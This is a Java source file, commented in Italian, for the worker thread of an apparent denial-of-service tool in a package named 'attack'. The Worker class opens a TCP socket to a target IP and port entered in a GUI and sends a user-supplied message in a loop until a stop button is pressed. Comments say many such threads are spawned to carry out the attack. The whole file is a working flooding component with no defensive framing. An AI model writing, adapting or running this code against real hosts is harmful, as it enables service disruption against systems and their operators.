package attack;

/*
 * Classe dei thread attaccanti, nel funzionamento del programma viene utilizzata dalla classe WorkerCreator.
 */


import java.io.PrintWriter;
import java.net.Socket;

public class Worker implements Runnable{

	/*
	 * Dichiarazione variabili
	 */
	
	private String host; 		//IP da attaccare;
	private int port;			//porta sulla quale attaccare;
	private int timeout;		//tempo di attesa tra un messaggio e l'altro;
	private String message;		//messaggio inviato dai thread al momento dell'attacco;
	public static boolean run = false; 
	
	/*
	 * Costruttore della classe.
	 */
	
	public Worker (String host, int port, int timeout, String message) {
		this.host = host;
		this.port = port;
		this.timeout = timeout;
		this.message = message;
	}
	
	/*
	 * Thread che effettivamente esegue l'attacco.
	 * 
	 * Quando viene richiamato:
	 * crea un socket con host e porta presi dalle variabili che gli vengono passate (le stesse inserite nella GUI);
	 * crea un oggetto PrintWriter che viene usato per scrivere sul socket;
	 * entra in un ciclo while che si ripete fino a quando run = true, quindi fino a quando non viene cliccato il tasto "Stop",
	 * in questo ciclo scrive il messaggio "message" e attende per un tempo "timeout" dati entrambi in input dall'utente nella GUI;
	 * appena esce dal ciclo, quindi dopo che il tasto stop è stato cliccato, esce dal socket.
	 */
	
	public void run() {
				
				
				
			try {
				
				Socket socket = new Socket(host, port);
				
				PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
				
				while(run){
					out.println(message);
					Thread.sleep(timeout);
				}
				
				out.close();
				socket.close();

			}catch(Exception e) {}

	}
}
